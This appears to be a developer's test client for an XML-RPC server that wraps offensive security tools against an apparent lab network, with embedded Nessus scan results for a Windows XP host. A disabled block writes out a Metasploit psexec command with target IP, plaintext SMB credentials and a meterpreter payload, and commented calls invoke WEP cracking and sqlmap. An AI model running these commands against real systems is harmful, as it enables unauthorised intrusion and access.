#!/usr/bin/python
import xmlrpc.client
from time import sleep
import re
import sys

#safestringre=re.compile('[\x00-\x08\x0B-\x0C\x0E-\x1F\x80-\xFF]')
#def safestring(badstring):
        #"""makes a good strings out of a potentially bad one by escaping chars out of printable range"""
        ##safechars=safestringre.sub(lambda c: '%d' % ord(c.group(0)),badstring)
        #safechars=safestringre.sub('',badstring)
        ##get rid of chars we don't want in our xml 
        ##safechars=unwantedcharsre.sub('',safechars)
        #return safechars


#msfout='\x01\x02msf\x01\x02  exploit(\x01\x02\x01\x02psexec\x01\x02) > '
#print(msfout)
#print(len(msfout))
#print(safestring(msfout))
#print(len(safestring(msfout)))
#sys.exit()



s = xmlrpc.client.ServerProxy('http://localhost:8000',allow_none=True)
# Print list of available methods
print(s.system.listMethods())

if True:
    ajob=s.getSnortStats()
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)
    sys.exit()



if False: 
    #ajob=s.getCreds()
    #ajob=s.nessusScan('10.200.100.7')
    findings=[{'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '48405', 'pluginName': 'MS10-054: Vulnerabilities in SMB Server Could Allow Remote Code Execution (982214) (remote check)', 'severity': '4'}, {'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '47556', 'pluginName': 'MS10-012: Vulnerabilities in SMB Could Allow Remote Code Execution (971468) (uncredentialed check)', 'severity': '4'}, {'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '53503', 'pluginName': 'MS11-020: Vulnerability in SMB Server Could Allow Remote Code Execution (2508429) (remote check)', 'severity': '4'}, {'output': '\nThe following shares can be accessed as lbbiwmgm :\n\n- filez  - (readable)\n  + Content of this share :\n..\ntest.txt\ntroubleshooting.pcap\n\n', 'synopsis': 'It is possible to access a network share.', 'pluginID': '42411', 'pluginName': 'Microsoft Windows SMB Shares Unprivileged Access', 'severity': '3'}, {'output': "\n  - Administrator (id 500, Administrator account)\n  - Guest (id 501, Guest account)\n  - HelpAssistant (id 1000)\n  - HelpServicesGroup (id 1001)\n  - SUPPORT_388945a0 (id 1002)\n  - winxpPro (id 1003)\n\nNote that, in addition to the Administrator and Guest accounts, Nessus\nhas enumerated only those local users with IDs between 1000 and 1200.\nTo use a different range, edit the scan policy and change the 'Start\nUID' and/or 'End UID' preferences for this plugin, then re-run the\nscan.\n", 'synopsis': 'It is possible to enumerate local users.', 'pluginID': '10860', 'pluginName': 'SMB Use Host SID to Enumerate Local Users', 'severity': '0'}, {'output': '', 'synopsis': 'Arbitrary code can be executed on the remote host due to a flaw in the SMB implementation.', 'pluginID': '18502', 'pluginName': 'MS05-027: Vulnerability in SMB Could Allow Remote Code Execution (896422) (uncredentialed check)', 'severity': '4'}, {'output': "\nThe remote host SID value is :\n\n1-5-21-1220945662-1801674531-839522115\n\nThe value of 'RestrictAnonymous' setting is : unknown\n", 'synopsis': 'It is possible to obtain the host SID for the remote host.', 'pluginID': '10859', 'pluginName': 'Microsoft Windows SMB LsaQueryInformationPolicy Function SID Enumeration', 'severity': '0'}, {'output': '', 'synopsis': 'Nessus had insufficient access to the remote registry.', 'pluginID': '10428', 'pluginName': 'Microsoft Windows SMB Fully Accessible Registry Detection', 'severity': '0'}, {'output': '', 'synopsis': 'Access the remote Windows Registry.', 'pluginID': '10400', 'pluginName': 'Microsoft Windows SMB Registry Remotely Accessible', 'severity': '0'}, {'output': '\nHere are the SMB shares available on the remote host when logged as lbbiwmgm:\n\n  - IPC$\n  - filez\n  - ADMIN$\n  - C$\n', 'synopsis': 'It is possible to enumerate remote network shares.', 'pluginID': '10395', 'pluginName': 'Microsoft Windows SMB Shares Enumeration', 'severity': '0'}, {'output': '\nHere is the browse list of the remote host : \n\nWINXP-95C9409AB ( os : 5.1 )\n', 'synopsis': 'It is possible to obtain network information.', 'pluginID': '10397', 'pluginName': 'Microsoft Windows SMB LanMan Pipe Server Listing Disclosure', 'severity': '0'}, {'output': '', 'synopsis': 'It is possible to crash the remote host due to a flaw in SMB.', 'pluginID': '35362', 'pluginName': 'MS09-001: Microsoft Windows SMB Vulnerabilities Remote Code Execution (958687) (uncredentialed check)', 'severity': '4'}, {'output': 'It was possible to bind to the \\browser pipe', 'synopsis': 'It is possible to log into the remote Windows host with a NULL session.', 'pluginID': '26920', 'pluginName': 'Microsoft Windows SMB NULL Session Authentication', 'severity': '2'}, {'output': '', 'synopsis': 'It is possible to log into the remote host.', 'pluginID': '26919', 'pluginName': 'Microsoft Windows SMB Guest Account Local User Access', 'severity': '2'}, {'output': "- NULL sessions are enabled on the remote host\n- Remote users are authenticated as 'Guest'\n", 'synopsis': 'It is possible to log into the remote host.', 'pluginID': '10394', 'pluginName': 'Microsoft Windows SMB Log In Possible', 'severity': '0'}, {'output': 'The remote Operating System is : Windows 5.1\nThe remote native lan manager is : Windows 2000 LAN Manager\nThe remote SMB Domain Name is : WINXP-95C9409AB\n', 'synopsis': 'It is possible to obtain information about the remote operating system.', 'pluginID': '10785', 'pluginName': 'Microsoft Windows SMB NativeLanManager Remote System Information Disclosure', 'severity': '0'}, {'output': 'The following 6 NetBIOS names have been gathered :\n\n WINXP-95C9409AB  = Computer name\n WORKGROUP        = Workgroup / Domain name\n WINXP-95C9409AB  = File Server Service\n WORKGROUP        = Browser Service Elections\n WORKGROUP        = Master Browser\n __MSBROWSE__     = Master Browser\n\nThe remote host has the following MAC address on its adapter :\n   52:54:00:00:ee:5c', 'synopsis': 'It is possible to obtain the network name of the remote host.', 'pluginID': '10150', 'pluginName': 'Windows NetBIOS / SMB Remote Host Information Disclosure', 'severity': '0'}, {'output': '\nAn SMB server is running on this port.\n', 'synopsis': 'A file / print sharing service is listening on the remote host.', 'pluginID': '11011', 'pluginName': 'Microsoft Windows SMB Service Detection', 'severity': '0'}, {'output': '\nA CIFS server is running on this port.\n', 'synopsis': 'A file / print sharing service is listening on the remote host.', 'pluginID': '11011', 'pluginName': 'Microsoft Windows SMB Service Detection', 'severity': '0'}, {'output': 'Port 3389/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 135/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 445/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 139/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}]    
    ajob=s.ettercapPcap('10.200.100.7',findings)
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)
    sys.exit()

#ajob=s.getHelp("aircrack-ng")
#while s.jobresult(ajob) in ('','<queued>','<started>'):
    #sleep(.1)
    #print("no result yet...waiting")
    #print(s.jobs())	
#aresult=s.jobresult(ajob)
#print('job result is:'  + str(aresult))
#s.jobdelete(ajob)

#ajob=s.monitorAccessPoint("00:24:37:26:ca:d0")
#ajob=s.crackWEPAccessPoint("00:24:37:26:CA:d0","dump.qwest1824-01.cap")
#ajob=s.getAccessPoints()


#ajob=s.getTweets(2)
#ajob=s.getSnortStats()
#ajob=s.getSnortPriorityTotals()
#ajob=s.getNetworks()
#ajob=s.scanNetwork('192.168.1.0/24')
#ajob=s.nessusScan('192.168.1.1')
#ajob=s.sayText("one, two, one two this is just a test\n\n")

nessusout=[{'hostName': '10.200.100.7', 'findings': [{'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '48405', 'pluginName': 'MS10-054: Vulnerabilities in SMB Server Could Allow Remote Code Execution (982214) (remote check)', 'severity': '4'}, {'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '47556', 'pluginName': 'MS10-012: Vulnerabilities in SMB Could Allow Remote Code Execution (971468) (uncredentialed check)', 'severity': '4'}, {'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '53503', 'pluginName': 'MS11-020: Vulnerability in SMB Server Could Allow Remote Code Execution (2508429) (remote check)', 'severity': '4'}, {'output': '\nThe following shares can be accessed as lbbiwmgm :\n\n- filez  - (readable)\n  + Content of this share :\n..\ntest.txt\n\n', 'synopsis': 'It is possible to access a network share.', 'pluginID': '42411', 'pluginName': 'Microsoft Windows SMB Shares Unprivileged Access', 'severity': '3'}, {'output': "\n  - Administrator (id 500, Administrator account)\n  - Guest (id 501, Guest account)\n  - HelpAssistant (id 1000)\n  - HelpServicesGroup (id 1001)\n  - SUPPORT_388945a0 (id 1002)\n  - winxpPro (id 1003)\n\nNote that, in addition to the Administrator and Guest accounts, Nessus\nhas enumerated only those local users with IDs between 1000 and 1200.\nTo use a different range, edit the scan policy and change the 'Start\nUID' and/or 'End UID' preferences for this plugin, then re-run the\nscan.\n", 'synopsis': 'It is possible to enumerate local users.', 'pluginID': '10860', 'pluginName': 'SMB Use Host SID to Enumerate Local Users', 'severity': '0'}, {'output': '', 'synopsis': 'Arbitrary code can be executed on the remote host due to a flaw in the SMB implementation.', 'pluginID': '18502', 'pluginName': 'MS05-027: Vulnerability in SMB Could Allow Remote Code Execution (896422) (uncredentialed check)', 'severity': '4'}, {'output': "\nThe remote host SID value is :\n\n1-5-21-1220945662-1801674531-839522115\n\nThe value of 'RestrictAnonymous' setting is : unknown\n", 'synopsis': 'It is possible to obtain the host SID for the remote host.', 'pluginID': '10859', 'pluginName': 'Microsoft Windows SMB LsaQueryInformationPolicy Function SID Enumeration', 'severity': '0'}, {'output': '', 'synopsis': 'Nessus had insufficient access to the remote registry.', 'pluginID': '10428', 'pluginName': 'Microsoft Windows SMB Fully Accessible Registry Detection', 'severity': '0'}, {'output': '', 'synopsis': 'Access the remote Windows Registry.', 'pluginID': '10400', 'pluginName': 'Microsoft Windows SMB Registry Remotely Accessible', 'severity': '0'}, {'output': '\nHere are the SMB shares available on the remote host when logged as lbbiwmgm:\n\n  - IPC$\n  - filez\n  - ADMIN$\n  - C$\n', 'synopsis': 'It is possible to enumerate remote network shares.', 'pluginID': '10395', 'pluginName': 'Microsoft Windows SMB Shares Enumeration', 'severity': '0'}, {'output': '\nHere is the browse list of the remote host : \n\nWINXP-95C9409AB ( os : 5.1 )\n', 'synopsis': 'It is possible to obtain network information.', 'pluginID': '10397', 'pluginName': 'Microsoft Windows SMB LanMan Pipe Server Listing Disclosure', 'severity': '0'}, {'output': '', 'synopsis': 'It is possible to crash the remote host due to a flaw in SMB.', 'pluginID': '35362', 'pluginName': 'MS09-001: Microsoft Windows SMB Vulnerabilities Remote Code Execution (958687) (uncredentialed check)', 'severity': '4'}, {'output': 'It was possible to bind to the \\browser pipe', 'synopsis': 'It is possible to log into the remote Windows host with a NULL session.', 'pluginID': '26920', 'pluginName': 'Microsoft Windows SMB NULL Session Authentication', 'severity': '2'}, {'output': '', 'synopsis': 'It is possible to log into the remote host.', 'pluginID': '26919', 'pluginName': 'Microsoft Windows SMB Guest Account Local User Access', 'severity': '2'}, {'output': "- NULL sessions are enabled on the remote host\n- Remote users are authenticated as 'Guest'\n", 'synopsis': 'It is possible to log into the remote host.', 'pluginID': '10394', 'pluginName': 'Microsoft Windows SMB Log In Possible', 'severity': '0'}, {'output': 'The remote Operating System is : Windows 5.1\nThe remote native lan manager is : Windows 2000 LAN Manager\nThe remote SMB Domain Name is : WINXP-95C9409AB\n', 'synopsis': 'It is possible to obtain information about the remote operating system.', 'pluginID': '10785', 'pluginName': 'Microsoft Windows SMB NativeLanManager Remote System Information Disclosure', 'severity': '0'}, {'output': 'The following 6 NetBIOS names have been gathered :\n\n WINXP-95C9409AB  = Computer name\n WORKGROUP        = Workgroup / Domain name\n WINXP-95C9409AB  = File Server Service\n WORKGROUP        = Browser Service Elections\n WORKGROUP        = Master Browser\n __MSBROWSE__     = Master Browser\n\nThe remote host has the following MAC address on its adapter :\n   52:54:00:00:ee:5c', 'synopsis': 'It is possible to obtain the network name of the remote host.', 'pluginID': '10150', 'pluginName': 'Windows NetBIOS / SMB Remote Host Information Disclosure', 'severity': '0'}, {'output': '\nAn SMB server is running on this port.\n', 'synopsis': 'A file / print sharing service is listening on the remote host.', 'pluginID': '11011', 'pluginName': 'Microsoft Windows SMB Service Detection', 'severity': '0'}, {'output': '\nA CIFS server is running on this port.\n', 'synopsis': 'A file / print sharing service is listening on the remote host.', 'pluginID': '11011', 'pluginName': 'Microsoft Windows SMB Service Detection', 'severity': '0'}, {'output': 'Port 3389/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 135/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 445/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 139/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}]}]
findings=[{'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '48405', 'pluginName': 'MS10-054: Vulnerabilities in SMB Server Could Allow Remote Code Execution (982214) (remote check)', 'severity': '4'}, {'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '47556', 'pluginName': 'MS10-012: Vulnerabilities in SMB Could Allow Remote Code Execution (971468) (uncredentialed check)', 'severity': '4'}, {'output': '', 'synopsis': 'It is possible to execute arbitrary code on the remote Windows host due to flaws in its SMB implementation.', 'pluginID': '53503', 'pluginName': 'MS11-020: Vulnerability in SMB Server Could Allow Remote Code Execution (2508429) (remote check)', 'severity': '4'}, {'output': '\nThe following shares can be accessed as lbbiwmgm :\n\n- filez  - (readable)\n  + Content of this share :\n..\ntest.txt\ntroubleshooting.pcap\n\n', 'synopsis': 'It is possible to access a network share.', 'pluginID': '42411', 'pluginName': 'Microsoft Windows SMB Shares Unprivileged Access', 'severity': '3'}, {'output': "\n  - Administrator (id 500, Administrator account)\n  - Guest (id 501, Guest account)\n  - HelpAssistant (id 1000)\n  - HelpServicesGroup (id 1001)\n  - SUPPORT_388945a0 (id 1002)\n  - winxpPro (id 1003)\n\nNote that, in addition to the Administrator and Guest accounts, Nessus\nhas enumerated only those local users with IDs between 1000 and 1200.\nTo use a different range, edit the scan policy and change the 'Start\nUID' and/or 'End UID' preferences for this plugin, then re-run the\nscan.\n", 'synopsis': 'It is possible to enumerate local users.', 'pluginID': '10860', 'pluginName': 'SMB Use Host SID to Enumerate Local Users', 'severity': '0'}, {'output': '', 'synopsis': 'Arbitrary code can be executed on the remote host due to a flaw in the SMB implementation.', 'pluginID': '18502', 'pluginName': 'MS05-027: Vulnerability in SMB Could Allow Remote Code Execution (896422) (uncredentialed check)', 'severity': '4'}, {'output': "\nThe remote host SID value is :\n\n1-5-21-1220945662-1801674531-839522115\n\nThe value of 'RestrictAnonymous' setting is : unknown\n", 'synopsis': 'It is possible to obtain the host SID for the remote host.', 'pluginID': '10859', 'pluginName': 'Microsoft Windows SMB LsaQueryInformationPolicy Function SID Enumeration', 'severity': '0'}, {'output': '', 'synopsis': 'Nessus had insufficient access to the remote registry.', 'pluginID': '10428', 'pluginName': 'Microsoft Windows SMB Fully Accessible Registry Detection', 'severity': '0'}, {'output': '', 'synopsis': 'Access the remote Windows Registry.', 'pluginID': '10400', 'pluginName': 'Microsoft Windows SMB Registry Remotely Accessible', 'severity': '0'}, {'output': '\nHere are the SMB shares available on the remote host when logged as lbbiwmgm:\n\n  - IPC$\n  - filez\n  - ADMIN$\n  - C$\n', 'synopsis': 'It is possible to enumerate remote network shares.', 'pluginID': '10395', 'pluginName': 'Microsoft Windows SMB Shares Enumeration', 'severity': '0'}, {'output': '\nHere is the browse list of the remote host : \n\nWINXP-95C9409AB ( os : 5.1 )\n', 'synopsis': 'It is possible to obtain network information.', 'pluginID': '10397', 'pluginName': 'Microsoft Windows SMB LanMan Pipe Server Listing Disclosure', 'severity': '0'}, {'output': '', 'synopsis': 'It is possible to crash the remote host due to a flaw in SMB.', 'pluginID': '35362', 'pluginName': 'MS09-001: Microsoft Windows SMB Vulnerabilities Remote Code Execution (958687) (uncredentialed check)', 'severity': '4'}, {'output': 'It was possible to bind to the \\browser pipe', 'synopsis': 'It is possible to log into the remote Windows host with a NULL session.', 'pluginID': '26920', 'pluginName': 'Microsoft Windows SMB NULL Session Authentication', 'severity': '2'}, {'output': '', 'synopsis': 'It is possible to log into the remote host.', 'pluginID': '26919', 'pluginName': 'Microsoft Windows SMB Guest Account Local User Access', 'severity': '2'}, {'output': "- NULL sessions are enabled on the remote host\n- Remote users are authenticated as 'Guest'\n", 'synopsis': 'It is possible to log into the remote host.', 'pluginID': '10394', 'pluginName': 'Microsoft Windows SMB Log In Possible', 'severity': '0'}, {'output': 'The remote Operating System is : Windows 5.1\nThe remote native lan manager is : Windows 2000 LAN Manager\nThe remote SMB Domain Name is : WINXP-95C9409AB\n', 'synopsis': 'It is possible to obtain information about the remote operating system.', 'pluginID': '10785', 'pluginName': 'Microsoft Windows SMB NativeLanManager Remote System Information Disclosure', 'severity': '0'}, {'output': 'The following 6 NetBIOS names have been gathered :\n\n WINXP-95C9409AB  = Computer name\n WORKGROUP        = Workgroup / Domain name\n WINXP-95C9409AB  = File Server Service\n WORKGROUP        = Browser Service Elections\n WORKGROUP        = Master Browser\n __MSBROWSE__     = Master Browser\n\nThe remote host has the following MAC address on its adapter :\n   52:54:00:00:ee:5c', 'synopsis': 'It is possible to obtain the network name of the remote host.', 'pluginID': '10150', 'pluginName': 'Windows NetBIOS / SMB Remote Host Information Disclosure', 'severity': '0'}, {'output': '\nAn SMB server is running on this port.\n', 'synopsis': 'A file / print sharing service is listening on the remote host.', 'pluginID': '11011', 'pluginName': 'Microsoft Windows SMB Service Detection', 'severity': '0'}, {'output': '\nA CIFS server is running on this port.\n', 'synopsis': 'A file / print sharing service is listening on the remote host.', 'pluginID': '11011', 'pluginName': 'Microsoft Windows SMB Service Detection', 'severity': '0'}, {'output': 'Port 3389/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 135/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 445/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}, {'output': 'Port 139/tcp was found to be open', 'synopsis': 'It is possible to determine which TCP ports are open.', 'pluginID': '10335', 'pluginName': 'Nessus TCP scanner', 'severity': '0'}]
#ajob=s.ettercapPcap('10.200.100.7',findings)
#ajob=s.getCreds()

#ajob=s.getSiteURLS('10.200.100.8',True)
#ajob=s.getSiteURLS('10.200.100.7','','')
#ajob=s.sqlMap('http://10.200.100.8/challenges/challenge1.php',True)

if False:
    ajob=s.nbdConnect()
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)

    ajob=s.getFLS('RECYCLE')
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)


    ajob=s.getRifiuti(10596)
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)


    ajob=s.getIcat(10589)
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)



    if False:
        ajob=s.nbdDisconnect()
        while s.jobresult(ajob) in ('','<queued>','<started>'):
            sleep(.1)
            print("no result yet...waiting")
            print(s.jobs())	
        aresult=s.jobresult(ajob)
        print('job result is:'  + str(aresult))
        s.jobdelete(ajob)


if False: 
    #msf test cases.
    #use without a console interface calling basic rpc functions
    #ajob=s.msfHosts()
    ##job result is:[{'name': 'WINXP-95C9409AB', 'address': '10.200.100.7'}, {'name': '', 'address': '192.168.1.103'}]
    #while s.jobresult(ajob) in ('','<queued>','<started>'):
        #sleep(.1)
        #print("no result yet...waiting")
        #print(s.jobs())	
    #aresult=s.jobresult(ajob)
    #print('job result is:'  + str(aresult))
    #s.jobdelete(ajob)
    
    #ajob=s.msfConsoleCreate()
    #while s.jobresult(ajob) in ('','<queued>','<started>'):
        #sleep(.1)
        #print("no result yet...waiting")
        #print(s.jobs())	
    #aresult=s.jobresult(ajob)
    #print('job result is:'  + str(aresult))
    #s.jobdelete(ajob)
    
    ajob=s.msfConsoleRead()
    print(type(ajob),ajob)
    print(s.jobs())
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)
    for line in aresult:
        print(line['prompt'],line['line'])
    
    sleep(2)
    
    ajob=s.msfConsoleRead()
    print(type(ajob),ajob)
    print(s.jobs())
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)
    for line in aresult:
        print(line['prompt'],line['line'])


    #run post/windows/gather/forensics/nbd_server  DEVICE=\\\\\\\\.\\\\C:
    sleep(2)
    #ajob=s.msfConsoleWrite('info exploit/windows/smb/psexec')
    msfcommand="""
    use exploit/windows/smb/psexec
    set RHOST 10.200.100.7
    set SHARE filez
    set SMBUser winxppro
    set SMBPass winxppro
    set PAYLOAD windows/meterpreter/bind_tcp 
    show options                
    """
    #msfcommand="""
    #use exploit/windows/smb/psexec
    #show options                
    #"""
    ajob=s.msfConsoleWrite(msfcommand)
    print(ajob)
    print(s.jobs())	
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)
    
    sleep(2)
    ajob=s.msfConsoleRead()
    while s.jobresult(ajob) in ('','<queued>','<started>'):
        sleep(.1)
        print("no result yet...waiting")
        print(s.jobs())	
    aresult=s.jobresult(ajob)
    print('job result is:'  + str(aresult))
    s.jobdelete(ajob)
    for line in aresult:
        print(line['prompt'],line['line'])
    


sys.exit()

ajob=s.pingIT("127.0.0.1")
while s.jobresult(ajob) in ('','<queued>','<started>'):
    sleep(.1)
    print("no result yet...waiting")
    print(s.jobs())	
aresult=s.jobresult(ajob)
print('scan job result is:'  + str(aresult))

sys.exit()

ajob=s.scanAccessPoints()
while s.jobresult(ajob) in ('','<queued>','<started>'):
    sleep(.1)
    print("no result yet...waiting")
    print(s.jobs())	
aresult=s.jobresult(ajob)
print('scan job result is:'  + str(aresult))



ajob=s.getAccessPoints()
while s.jobresult(ajob) in ('','<queued>','<started>'):
    sleep(.1)
    print("no result yet...waiting")
    print(s.jobs())	
aresult=s.jobresult(ajob)
print('job result is:'  + str(aresult))
for row in aresult:
    print(row['bssid'], row['essid'], row['channel'])
s.jobdelete(ajob)



sys.exit()
